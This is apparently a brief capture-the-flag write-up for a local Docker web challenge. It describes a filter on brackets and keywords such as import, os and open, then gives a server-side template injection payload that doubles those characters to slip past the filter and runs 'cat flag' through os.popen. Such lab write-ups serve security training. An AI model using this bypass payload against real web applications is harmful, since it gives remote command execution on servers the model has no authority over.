# Day1 web1


Use 
```
docker-compose up -d
```

Access localhost:8003


filter the character `[]`,`()`, use `[[]]`, `(())` to bypass it.`import`,`os`,`sys`,`commands`,`subprocess`,`open`,`eval`,use `imimportport` etc to bypass it



payload
```python
{{[[]].__class__.__base__.__subclasses__(())[155].__init__.__globals__['__builtins__']['__imimportport__']("ooss").popopenen("cat flag").read(())}}
```

